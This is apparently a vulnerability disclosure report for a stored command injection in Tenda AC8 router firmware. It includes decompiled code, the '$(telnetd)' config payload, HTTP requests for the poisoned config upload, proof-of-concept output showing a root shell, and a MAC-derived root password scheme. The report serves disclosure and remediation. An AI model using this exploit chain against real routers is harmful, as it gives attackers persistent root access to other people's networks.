# CVE Submission Report: Tenda AC8 Stored Command Injection via Config Upload

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Title** | Stored OS Command Injection via Config Upload in netctrl `route_set_user_policy_rule` |
| **Vendor** | Shenzhen Tenda Technology Co., Ltd. |
| **Product** | Tenda AC8 V5.0 |
| **Firmware Version** | V16.03.50.11(955) |
| **Affected Component** | `/bin/netctrl` (network control daemon) |
| **Affected Function** | `route_set_user_policy_rule` (address: `0x00424690`) |
| **Injection Sink** | `doSystemCmd` in `/lib/libcommon.so` (calls `system()`) |
| **Vulnerability Type** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **Secondary CWE** | CWE-20: Improper Input Validation |
| **CVSS v3.1 Score** | **8.8 (High)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Attack Vector** | Adjacent Network (LAN — authenticated config upload) |
| **Authentication Required** | Low (web admin password) |
| **User Interaction** | None |
| **Impact** | Persistent root code execution on every boot, full device compromise |

---

## 2. Affected Products

| Product | Firmware Version | Architecture | Status |
|---------|-----------------|--------------|--------|
| Tenda AC8 V5.0 | V16.03.50.11(955)_cn | MIPS32 LE | Confirmed vulnerable |

**Note:** Other Tenda models sharing the `netctrl` binary and cfm config store architecture (AC6, AC10, AC15, AC18) may also be affected if they use the same `route_set_user_policy_rule` implementation.

### Binary Identification

**Injection target:**
- **File:** `/bin/netctrl`
- **Type:** ELF 32-bit LSB executable, MIPS, little-endian
- **Protections:** NX enabled, no canary, no PIE, no RELRO (1/5)

**Injection sink (shared library):**
- **File:** `/lib/libcommon.so`
- **Function:** `doSystemCmd` — calls `vsnprintf()` → `system()` with unsanitized format string arguments

**Config upload handler:**
- **File:** `/bin/httpd`
- **Handler:** `/cgi-bin/UploadCfg` → `systool_upgradefile_handle` → `tpi_sys_cfg_upload` → `cfm Upload`

---

## 3. Vulnerability Description

The `netctrl` daemon in Tenda AC8 V5.0 firmware contains a stored OS command injection vulnerability in its policy rule processing function `route_set_user_policy_rule`. Config values stored via `cfm` (configuration manager) are read using `GetValue()`, parsed by `sscanf()`, and passed directly to `doSystemCmd()` — which internally calls `system()` — without any sanitization of shell metacharacters.

An attacker who can upload a config file via the web interface (`/cgi-bin/UploadCfg`) can inject arbitrary shell commands into the `wans.policy.list1` config key. The injected command executes as root when `netctrl` processes the policy rules at boot via `route_init()`.

**The injection is persistent:** the malicious config value is stored in flash memory and survives reboots. The injected command executes on every boot until the device is factory reset.

### Attack Flow

1. Authenticate to the web interface (requires admin password)
2. Download the current config via `/cgi-bin/DownloadCfg`
3. Inject three config keys: `wans.policy.enable=1`, `wans.policy.listnum=1`, and `wans.policy.list1` with a command substitution payload in the destination IP field
4. Upload the modified config via `/cgi-bin/UploadCfg` (triggers automatic reboot)
5. On reboot, `netctrl` → `route_init()` → `route_set_user_policy_rule()` → `doSystemCmd()` → `system()` evaluates the injected command as root

---

## 4. Technical Root Cause

### 4.1 Config Upload Path — `/cgi-bin/UploadCfg` (/bin/httpd)

The upload handler processes config files through the following chain:

1. `webCgiGetUploadFile()` — extracts the multipart file upload
2. `strncmp()` validates the file starts with `#The word of "Default" must not be removed`
3. `tpi_sys_cfg_upload()` splits at `##the public configure end##` separator
4. Writes to `/var/default.cfg` and executes `doSystemCmd("cfm Upload")`
5. `cfm Upload` loads all `key=value` pairs into the config store verbatim — **no sanitization**
6. `CommitCfm()` persists the config to flash memory
7. `systool_sys_handle(0)` reboots the device

### 4.2 Boot-Time Gate — `route_init()` (/bin/netctrl, FUN_00422e34)

```c
void route_init(void) {
    char local_10[8] = {0};

    GetValue("wans.policy.enable", local_10);
    if (strcmp(local_10, "1") == 0) {
        route_set_user_policy_rule();    // ONLY called if enable == "1"
    }
    netctrl_module_register_opses(g_route_msg_ops, 2);
    callback_route = route_lan_change_proc;
}
```

**Critical gate:** `route_init()` only calls `route_set_user_policy_rule()` when `wans.policy.enable` equals `"1"`. The attacker MUST include this key in the uploaded config. Without it, the injected policy rule is stored but never processed.

### 4.3 Command Injection Sink — `route_set_user_policy_rule()` (/bin/netctrl)

```c
void route_set_user_policy_rule(void) {
    char acStack_438[256], acStack_338[256];
    char acStack_20c[256], acStack_10c[256];   // dest_IP buffer
    int local_234, local_230, local_238, local_c;

    GetValue("wans.policy.listnum", acStack_438);
    int count = atoi(acStack_438);
    if (count > 0x40) count = 0x40;

    for (int i = 0; i < count; i++) {
        snprintf(acStack_338, 0x100, "wans.policy.list%d", i + 1);
        GetValue(acStack_338, acStack_438);

        // Parse semicolon-delimited fields — NO SANITIZATION
        sscanf(acStack_438, "%[^;];%[^;];%u-%u;%u;%d",
               acStack_20c,     // IP range (src)
               acStack_10c,     // dest_IP — ATTACKER CONTROLLED
               &local_234,      // port start
               &local_230,      // port end
               &local_238,      // mark
               &local_c);       // enabled flag

        if (local_c != 0) {
            if (strcmp(acStack_10c, "0.0.0.0") != 0) {
                // dest_IP is NOT 0.0.0.0 → used directly in -d argument
                doSystemCmd(
                    "iptables -t mangle -A %s -p tcp --dport %d:%d "
                    "-d %s -m iprange --src-range %s-%s "
                    "-j MARK --set-mark %d",
                    "Xpolicy", local_234, local_230,
                    acStack_10c,    // ← INJECTED HERE: $(telnetd)
                    &local_22c, &local_21c,
                    local_238 << 4
                );
                // ... repeated for UDP, and for -D (delete) variants
            }
        }
    }
}
```

### 4.4 `doSystemCmd()` — The Sink (/lib/libcommon.so)

```c
int doSystemCmd(char *format, ...) {
    char acStack_408[1024];
    va_list args;

    memset(acStack_408, 0, 0x400);
    va_start(args, format);
    vsnprintf(acStack_408, 0x400, format, args);
    va_end(args);

    return system(acStack_408);    // ← EXECUTES WITH sh -c
}
```

`doSystemCmd()` is a thin wrapper around `system()`. The format string is expanded by `vsnprintf()`, then passed directly to `system()`, which invokes `/bin/sh -c <command>`. Shell metacharacters including `$(...)` command substitution are evaluated.

### 4.5 Injected Value

The policy rule format is semicolon-delimited:

```
IP_range;dest_IP;port_start-port_end;mark;enabled
```

The injected value:

```
192.168.0.1-192.168.0.2;$(telnetd);80-443;1;1
```

- `sscanf("%[^;]")` copies `$(telnetd)` into `acStack_10c`
- `strcmp(acStack_10c, "0.0.0.0")` returns non-zero → enters the else branch
- `doSystemCmd("iptables -t mangle -A Xpolicy -p tcp --dport 80:443 -d $(telnetd) ...")` is called
- `system()` invokes `sh -c`, which evaluates `$(telnetd)` before `iptables` processes its arguments
- `telnetd` daemonizes immediately, surviving any subsequent iptables error

---

## 5. CVSS v3.1 Scoring Breakdown

**Vector:** `CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**Score: 8.8 (High)**

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Adjacent (A) | Requires LAN access to the web interface |
| Attack Complexity | Low (L) | Config format is documented, no race conditions, predictable execution |
| Privileges Required | Low (L) | Requires web admin authentication (config upload is authenticated) |
| User Interaction | None (N) | Device reboots automatically after config upload |
| Scope | Unchanged (U) | Compromise of the router (the vulnerable component) |
| Confidentiality | High (H) | Root shell access: /etc/shadow, TLS keys, WiFi credentials, config dump |
| Integrity | High (H) | Arbitrary command execution as root, firmware modification, persistent backdoor |
| Availability | High (H) | Can brick device, disable services, or cause boot loops |

**Note:** If combined with the IPv6 authentication bypass (separate CVE), the config upload can be performed without credentials, elevating PR to None and increasing the effective CVSS to 9.1.

---

## 6. Exploitation

### 6.1 Prerequisites

- LAN access to the router's web interface
- Web admin password (or combined with auth bypass for unauthenticated exploitation)
- No physical access required

### 6.2 Attack Steps

**Step 1 — Authenticate to httpd:**

```http
POST /login/Auth HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=<MD5_HASH>
```

Note: The web UI sends `hex_md5(password)`, not the plaintext password.

**Step 2 — Download current config (preserves existing settings):**

```http
GET /cgi-bin/DownloadCfg HTTP/1.1
Cookie: password=<session_cookie>
```

Returns ~22KB config file with `key=value` pairs.

**Step 3 — Inject malicious policy rule into config:**

Add three keys before the `##the public configure end##` separator:

```
wans.policy.enable=1
wans.policy.listnum=1
wans.policy.list1=192.168.0.1-192.168.0.2;$(telnetd);80-443;1;1
```

All three keys are required:
- `enable=1` — passes the gate check in `route_init()`
- `listnum=1` — tells `route_set_user_policy_rule()` how many rules to process
- `list1=...` — the rule containing the injected command

**Step 4 — Upload poisoned config (triggers reboot):**

```http
POST /cgi-bin/UploadCfg HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="filename"; filename="default.cfg"
Content-Type: application/octet-stream

<modified config content>
------boundary--
```

The device reboots automatically after processing the upload.

**Step 5 — Wait for reboot (~45-60 seconds):**

After reboot:
1. `cfmd` loads config from flash
2. `netctrl` starts → `route_init()` → `GetValue("wans.policy.enable")` returns `"1"` → gate passes
3. `route_set_user_policy_rule()` reads `wans.policy.list1`
4. `sscanf()` extracts `$(telnetd)` into the dest_IP field
5. `doSystemCmd("iptables ... -d $(telnetd) ...")` → `system()` → shell evaluates `$(telnetd)`
6. `telnetd` starts as a background daemon on port 23

**Step 6 — Connect to telnet as root:**

```
$ telnet 192.168.0.1
login: root
Password: <MAC-derived password>
# id
uid=0(root) gid=0(root)
```

Root password derived from MAC address via `cnsl_safe` algorithm:
```
MAC octets [4],[5] → "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}" → base64
```

---

## 7. Proof of Concept

A complete POC script (`poc_cmdi_config_upload.py`) automates the full attack:

```bash
python3 poc_cmdi_config_upload.py \
    --target http://192.168.0.1 \
    --current-password password123
```

**Output (confirmed on live device 2025-03-04):**
```
========================================================================
  Tenda AC8 — Stored Command Injection via Config Upload
  → netctrl route_set_user_policy_rule → doSystemCmd → Root Shell
========================================================================

  Target:         http://192.168.0.1
  Injection:      wans.policy.list1=192.168.0.1-192.168.0.2;$(telnetd);80-443;1;1
  Sink:           doSystemCmd("iptables ... -d $(telnetd) ...")
  Effect:         system() evaluates $(telnetd) → telnetd on port 23
  Persistence:    survives reboots (stored in cfm config)

[*] Step 1: Logging in to httpd...
    Password: password123 → MD5: 482c811da5d5b4bc6d497ffa98491e38
[+] Login successful!

[*] Step 2: Downloading current config...
[+] Downloaded config: 21957 bytes, 980 lines

[*] Step 3: Injecting command payload into config...
    Payload: wans.policy.enable=1
    Payload: wans.policy.listnum=1
    Payload: wans.policy.list1=192.168.0.1-192.168.0.2;$(telnetd);80-443;1;1
[+] Config modified: 22049 bytes

[*] Step 4: Uploading poisoned config...
[+] Config accepted! Device is rebooting...

[*] Step 5: Waiting for device to reboot (70s max)...
[+] Device is back online! (after ~33s)

[*] Step 6: Checking for telnet on 192.168.0.1:23...
[+] TELNET IS OPEN on 192.168.0.1:23!

[*] Step 7: Logging into telnet as root...
[+] ROOT SHELL ACTIVE!
    $ cat /etc/shadow
    root:$1$<redacted>:0:0:99999:7:::

========================================================================
  RESULT: ROOT SHELL OBTAINED — FULL DEVICE COMPROMISE
========================================================================
```

### UART Console Evidence

Simultaneous UART monitoring confirmed the injection chain:

```
argv[0] = netctrl
netctrl
[netctrl_start_services][1976]
...
```

Post-boot verification via UART:
```
~ # cfm get wans.policy.enable
1
~ # cfm get wans.policy.list1
192.168.0.1-192.168.0.2;$(telnetd);80-443;1;1
~ # netstat -tlnp | grep 23
tcp    0    0 :::23    :::*    LISTEN    1650/telnetd
```

The POC requires Python 3 with the `requests` library.

---

## 8. Impact Assessment

### Direct Impact
- **Persistent root code execution** — arbitrary commands run as root on every boot
- **Survives reboots** — injected config is stored in flash memory
- **Arbitrary command execution** — any shell command can be substituted for `telnetd` (e.g., reverse shell, data exfiltration, firmware modification)
- **Silent backdoor** — the malicious config entry appears as a normal policy rule

### Persistence Properties
- The injection survives power cycles and reboots
- The only remediation is a factory reset (`cfm reset`) which clears all config
- The attacker can modify the config to also disable factory reset buttons or lock out the admin

### Attack Escalation
- Combined with the IPv6 authentication bypass (separate CVE), this becomes an **unauthenticated persistent root backdoor** — no credentials needed at all
- The injected command can download and execute arbitrary payloads from the internet
- The router position enables MITM, DNS hijacking, and lateral movement across the network

---

## 9. Remediation Recommendations

1. **Sanitize config values before passing to `doSystemCmd()`** — strip or reject shell metacharacters (`$`, `` ` ``, `|`, `;`, `&`, `(`, `)`) from all values read via `GetValue()` that will be used in `system()` calls
2. **Use `execve()` instead of `system()`** — avoid shell interpretation entirely by using direct exec with argument arrays
3. **Validate policy rule fields** — the dest_IP field should be validated as a legal IP address (regex or `inet_pton()`) before being used in iptables commands
4. **Validate config file contents on upload** — check that values conform to expected formats before storing them in cfm
5. **Sign config files** — implement cryptographic signing of config exports so tampered configs are rejected on upload

---

## 10. Disclosure Timeline

| Date | Event |
|------|-------|
| 2025-03-04 | Vulnerability discovered during firmware security assessment |
| 2025-03-04 | Initial POC failed — identified `wans.policy.enable` gate requirement via Ghidra analysis |
| 2025-03-04 | Updated POC confirmed on live device with UART console monitoring |
| 2025-03-04 | Vendor notified via email (security@tenda.com.cn, support@tenda.com.cn) |
| 2025-03-04 | CVE requested via VulDB |

---

## 11. References

- **Firmware:** Tenda AC8 V5.0 V16.03.50.11(955)
- **netctrl binary:** `/bin/netctrl` (MIPS32 LE, NX only, no canary/PIE/RELRO)
- **Sink library:** `/lib/libcommon.so` — `doSystemCmd()` calls `vsnprintf()` → `system()`
- **Config handler:** `/bin/httpd` — `/cgi-bin/UploadCfg` → `tpi_sys_cfg_upload()` → `cfm Upload`
- **CWE References:**
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-20: Improper Input Validation

---

## 12. Discoverer

[Your name / handle / organization]

---

*Analysis performed using Wairz firmware security assessment platform with Ghidra decompilation and live device UART monitoring.*
